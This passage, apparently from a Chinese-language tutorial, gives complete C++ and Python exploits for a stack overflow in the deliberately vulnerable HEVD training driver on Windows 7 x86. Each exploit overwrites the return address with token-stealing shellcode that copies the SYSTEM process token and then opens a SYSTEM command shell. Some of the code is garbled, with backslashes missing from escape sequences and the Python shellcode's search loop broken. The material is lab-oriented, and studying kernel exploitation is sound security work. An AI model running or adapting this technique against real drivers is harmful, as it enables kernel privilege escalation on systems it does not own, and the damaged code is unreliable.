C++版利用代码
    //https://github.com/OsandaMalith/Exploits/blob/master/HEVD/StackOverflowx86.cpp
    #include "stdafx.h"
    #include 
    #include 
    #include 
    /*
     * Title: HEVD x86 Stack Overflow Privelege Escalation Exploit
     * Platform: Windows 7 x86
     * Author: Osanda Malith Jayathissa (@OsandaMalith)
     * Website: https://osandamalith.com
     */
    #define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
    #define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
    #define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
    #define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
    #define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
    #define SYSTEM_PID         0x004  // SYSTEM Process PID
    VOID TokenStealingPayloadWin7() {
        __asm {
                pushad; Save registers state
                xor eax, eax; Set ZERO
                mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
                mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
                mov ecx, eax; Copy current process _EPROCESS structure
                mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4
            SearchSystemPID:
                mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
                sub eax, FLINK_OFFSET
                cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
                jne SearchSystemPID
                mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
                mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
                ; with SYSTEM process nt!_EPROCESS.Token
                ; End of Token Stealing Stub
                popad; Restore registers state
                ; Kernel Recovery Stub
                xor eax, eax; Set NTSTATUS SUCCEESS
                add esp, 12; Fix the stack
                pop ebp; Restore saved EBP
                ret 8; Return cleanly
        }
    }
    int _tmain(int argc, _TCHAR* argv[]) {
        HANDLE hDevice;
        LPCWSTR lpDeviceName = L"\\.\HacksysExtremeVulnerableDriver";
        PUCHAR lpInBuffer = NULL;
        DWORD lpBytesReturned = 0;
        STARTUPINFO si = { sizeof(STARTUPINFO) };
        PROCESS_INFORMATION pi;
        hDevice = CreateFile(
            lpDeviceName,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
            NULL);
        wprintf(L"[*] Author: @OsandaMalithn[*] Website: https://osandamalith.comnn");
        wprintf(L"[+] lpDeviceName: %lsn", lpDeviceName);
        if (hDevice == INVALID_HANDLE_VALUE) {
            wprintf(L"[!] Failed to get a handle to the driver. 0x%xn", GetLastError());
            return -1;
        }
        wprintf(L"[+] Device Handle: 0x%xn", hDevice);
        lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x900);
        if (!lpInBuffer) {
            wprintf(L"[!] Failed to allocated memory. %x", GetLastError());
            return -1;
        }
        RtlFillMemory(lpInBuffer, 0x900, 0x41);
        RtlFillMemory(lpInBuffer + 2076, 0x4, 0x42);
        *(lpInBuffer + 2080) = (DWORD)&TokenStealingPayloadWin7 & 0xFF;
        *(lpInBuffer + 2080 + 1) = ((DWORD)&TokenStealingPayloadWin7 & 0xFF00) >> 8;
        *(lpInBuffer + 2080 + 2) = ((DWORD)&TokenStealingPayloadWin7 & 0xFF0000) >> 0x10;
        *(lpInBuffer + 2080 + 3) = ((DWORD)&TokenStealingPayloadWin7 & 0xFF000000) >> 0x18;
        wprintf(L"[+] Sending IOCTL request with buffer: 0x222003n");
        DeviceIoControl(
            hDevice,
            0x222003, // IOCTL
            (LPVOID)lpInBuffer,
            2084,
            NULL,
            0,
            &lpBytesReturned,
            NULL);
        ZeroMemory(&si, sizeof si);
        si.cb = sizeof si;
        ZeroMemory(&pi, sizeof pi);
        IsUserAnAdmin() ?
        CreateProcess(
            L"C:\Windows\System32\cmd.exe",
            L"/T:17", 
            NULL,
            NULL,
            0,
            CREATE_NEW_CONSOLE,
            NULL,
            NULL,
            (STARTUPINFO *)&si,
            (PROCESS_INFORMATION *)&pi) :
        wprintf(L"[!] Exploit Failed!");
        HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
        CloseHandle(hDevice);
        return 0;
    }
    //EOF
Python版
    # https://github.com/OsandaMalith/Exploits/blob/master/HEVD/StackOverflowx86.py
    import os 
    import sys
    import struct
    from ctypes import *
    from ctypes.wintypes import *
    kernel32 = windll.kernel32
    def TokenStealingPayloadWin7():
        shellcode = (
            #---[Setup]
            "x60"                      # pushad
            "x64xA1x24x01x00x00"  # mov eax, fs:[KTHREAD_OFFSET]
            "x8Bx40x50"              # mov eax, [eax + EPROCESS_OFFSET]
            "x89xC1"                  # mov ecx, eax (Current _EPROCESS structure)
            "x8Bx98xF8x00x00x00"  # mov ebx, [eax + TOKEN_OFFSET]
            #---[Copy System PID token]
            "xBAx04x00x00x00"      # mov edx, 4 (SYSTEM PID)
            "x8Bx80xB8x00x00x00"  # mov eax, [eax + FLINK_OFFSET] |
            "x8Bx90xF8x00x00x00"  # mov edx, [eax + TOKEN_OFFSET]
            "x89x91xF8x00x00x00"  # mov [ecx + TOKEN_OFFSET], edx
            #---[Recover]
            "x61"                      # popad
            "x31xC0"                  # NTSTATUS -> STATUS_SUCCESS
            "x5D"                      # pop ebp
            "xC2x08x00"              # ret 8
        )
        shellcodePtr = id(shellcode) + 20
        return shellcodePtr
    def main():
        lpBytesReturned = c_ulong()
        hDevice = kernel32.CreateFileA("\\.\HackSysExtremeVulnerableDriver", 0xC0000000,0, None, 0x3, 0, None)
        if not hDevice or hDevice == -1:
            print "[!] Failed to get a handle to the driver " + str(ctypes.GetLastError())
            return -1
        buf = "x41" * 2080 + struct.pack("<L",TokenStealingPayloadWin7())
        bufSize  = len(buf)
        bufPtr = id(buf) + 20
        print "[+] Sending IOCTL request "
        kernel32.DeviceIoControl(hDevice, 0x222003, bufPtr, bufSize, None, 0,byref(lpBytesReturned)   , None)
        os.system('cmd.exe')
    if __name__ == '__main__':
        main()
    # EOF
这里获取到了Root权限
如果我们检查该过程，您可以看到它作为NT AUTHORITY / SYSTEM运行。